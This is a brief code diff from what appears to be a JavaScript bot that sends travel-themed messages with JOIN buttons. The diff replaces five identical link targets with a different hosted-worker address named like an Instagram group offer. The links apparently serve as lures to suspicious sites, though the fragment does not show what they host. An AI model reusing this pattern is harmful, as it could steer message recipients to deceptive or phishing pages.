@@ -166,11 +166,11 @@ async function handleTravelMessage(
 		'Witness the magical Northern Lights',
 	];
 	const websiteUrls = [
-		'https://telegram-p2p.pages.dev',
-		'https://telegram-p2p.pages.dev',
-		'https://telegram-p2p.pages.dev',
-		'https://telegram-p2p.pages.dev',
-		'https://telegram-p2p.pages.dev',
+		'https://insta-group-offer.bdv94gs62z.workers.dev',
+		'https://insta-group-offer.bdv94gs62z.workers.dev',
+		'https://insta-group-offer.bdv94gs62z.workers.dev',
+		'https://insta-group-offer.bdv94gs62z.workers.dev',
+		'https://insta-group-offer.bdv94gs62z.workers.dev',
 	];
 	const firstButtonTitles = [
 		'JOIN',
